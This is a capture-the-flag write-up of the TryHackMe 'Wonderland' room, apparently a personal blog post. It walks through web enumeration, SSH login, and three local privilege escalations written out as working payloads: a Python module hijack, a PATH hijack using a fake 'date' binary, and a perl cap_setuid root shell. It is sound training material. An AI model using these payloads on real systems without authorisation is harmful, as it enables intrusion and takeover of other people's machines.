---
layout: post
title: "TryHackMe — Wonderland"
date: 2026-05-15
category: writeup
platform: TryHackMe
difficulty: Medium
tags:
  - Steganography
  - PATH Hijacking
  - Python
  - Capabilities
  - Privilege Escalation
excerpt: "An Alice in Wonderland themed room involving steganography, credential discovery, and a three-stage privilege escalation chain using Python PATH hijacking, binary PATH hijacking, and Linux capabilities."
---

# [TryHackMe — Wonderland](https://tryhackme.com/room/wonderland)

## Overview

Wonderland is an Alice in Wonderland themed room that chains together credential discovery through web enumeration and a three-stage privilege escalation using different techniques at each step. The room has a clever twist — nothing is where you'd expect it to be.

**Attack chain:**
```
Recon → Web enumeration → robots.txt/page source → Credentials
→ SSH as alice → Python PATH hijack → Shell as rabbit
→ Binary PATH hijack (date) → Shell as hatter
→ Perl capabilities (cap_setuid) → Root
```

---

## 1. Recon

Started with an nmap scan to identify open services:

```bash
nmap -sV -sC <TARGET_IP>
```

Notable ports:
- **22** — SSH
- **80** — HTTP (Go HTTP server)

Then ran ffuf to enumerate hidden web directories:

```bash
ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt \
  -u http://<TARGET_IP>/FUZZ \
  -mc 200,301,302,403 \
  -t 64
```

Found several hidden directories. Browsing through them and checking `robots.txt` and page source revealed Alice's credentials.

![Credentials found in page source/robots.txt](/assets/images/writeups/wonderland/credentials.png)

  *Credentials for alice discovered through web enumeration*

---

## 2. Initial Access — SSH as alice

Used the discovered credentials to log in:

```bash
ssh alice@<TARGET_IP>
alice@wonderland:~$ whoami
alice
```

Immediately noticed the room's twist — the flags are in unusual locations:

```bash
ls /root
# user.txt     ← user flag is here, not in alice's home
ls /home/alice
# root.txt     ← root flag is here, not in /root
```

> **Wonderland's twist:** Everything is upside down — `user.txt` lives in `/root` and `root.txt` lives in `/home/alice`. You need root to read both.

Checked what alice can run as other users:

```bash
sudo -l
```

Output:

```
User alice may run the following commands:
    (rabbit) NOPASSWD: /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Alice can run a specific Python script as **rabbit** without a password.

---

## 3. Privilege Escalation — alice → rabbit (Python PATH Hijack)

Examined the script:

```bash
cat /home/alice/walrus_and_the_carpenter.py
```

The script imports the `random` module:

```python
import random
```

Like the `date` binary calling without a full path, Python's `import` searches for modules in order — starting with the **current directory** before system paths. This means if we create our own `random.py` in the current directory, Python will import ours instead of the real one.

Created a malicious `random.py` in alice's home directory:

```python
import os
print("Hope in!")
os.system("/bin/bash")
```

When `os.system("/bin/bash")` executes, it spawns an interactive shell inheriting the privileges of whoever is running the script — in this case, rabbit.

Ran the script as rabbit:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

```bash
rabbit@wonderland:~$ whoami
rabbit
```

![Shell as rabbit via Python PATH hijack](/assets/images/writeups/wonderland/rabbit-shell.png)

  *Our fake random.py executes instead of the real module, spawning a shell as rabbit*

---

## 4. Privilege Escalation — rabbit → hatter (Binary PATH Hijack)

In rabbit's home directory found a SUID binary called `teaParty`. Transferred it to Kali for analysis:

```bash
# On Kali
strings teaParty | awk 'length($0) > 10'
```

The `strings` command extracts human-readable text baked into the binary during compilation. Filtering with `awk 'length($0) > 10'` removes short noise strings, leaving only meaningful output.

The key line found:

```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

The binary calls `date` **without a full path** — it doesn't say `/bin/date`, just `date`. This means it searches `$PATH` in order to find it.

Also ran `checksec` to understand the binary's protections:

```bash
checksec --file=teaParty
```

```
Partial RELRO   No canary found   NX enabled   PIE enabled
```

No stack canary means buffer overflow protections are absent — but we don't need that here. The PATH hijack is simpler.

**The exploit — create a fake `date` in /tmp:**

`/tmp` is world-writable, meaning any user can create files there regardless of privilege level.

```bash
# Create fake date binary
echo "/bin/bash" > /tmp/date
chmod +x /tmp/date

# Prepend /tmp to PATH so our fake date is found first
export PATH=/tmp:$PATH

# Run teaParty — it calls 'date', finds ours first
./teaParty
```

```bash
hatter@wonderland:~$ whoami
hatter
```

![Shell as hatter via binary PATH hijack](/assets/images/writeups/wonderland/hatter-shell.png)

  *Prepending /tmp to PATH causes teaParty to execute our fake date binary instead of /bin/date*

---

## 5. Privilege Escalation — hatter → root (Perl Capabilities)

In hatter's home directory found a password. Used it to SSH in as hatter for a stable shell, then ran enumeration:

```bash
getcap -r / 2>/dev/null
```

Output:

```
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

**Linux capabilities** are a more granular alternative to SUID — instead of giving a binary full root privileges, you grant specific abilities. `cap_setuid` allows the binary to change its UID to any user, including root (UID 0).

`+ep` means the capability is **effective** and **permitted** — it applies immediately when the binary runs.

Checked GTFOBins under the **Capabilities** section for perl:

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
```

What this does:
- `POSIX::setuid(0)` — sets the process UID to 0 (root)
- `exec "/bin/sh"` — spawns a shell inheriting that UID

```bash
# whoami
root
```

![Root shell via perl capabilities](/assets/images/writeups/wonderland/root-shell.png)

  *perl's cap_setuid capability allows setting UID to 0 before spawning a shell*

---

## 6. Flags

```bash
# User flag (upside down — lives in /root)
cat /root/user.txt

# Root flag (upside down — lives in alice's home)
cat /home/alice/root.txt
```

---

## Key Takeaways

| Technique | Lesson |
|---|---|
| robots.txt / page source | Always read the source — credentials are often hiding in plain sight |
| Python module PATH hijack | If a privileged script imports a module, create a fake one in the current directory |
| Binary PATH hijack | If a binary calls a command without a full path, prepend a writable directory to PATH |
| `/tmp` as exploit staging | `/tmp` is always world-writable — use it when you lack write access elsewhere |
| Linux capabilities | `cap_setuid` on any interpreter (perl, python) is effectively root access |
| GTFOBins sections matter | Always check the **Capabilities** tab specifically — payloads differ from SUID/sudo |
| `strings` + `awk` | Quick recon on binaries — extracts hardcoded text to reveal what the binary does |

---

## Tools Used

- nmap
- ffuf
- steghide
- strings / awk
- checksec
- getcap
- GTFOBins
- netcat
- Python pty

---

*Room completed on TryHackMe. Write-up by [Wandipa Marema] — [2026-05-15]*
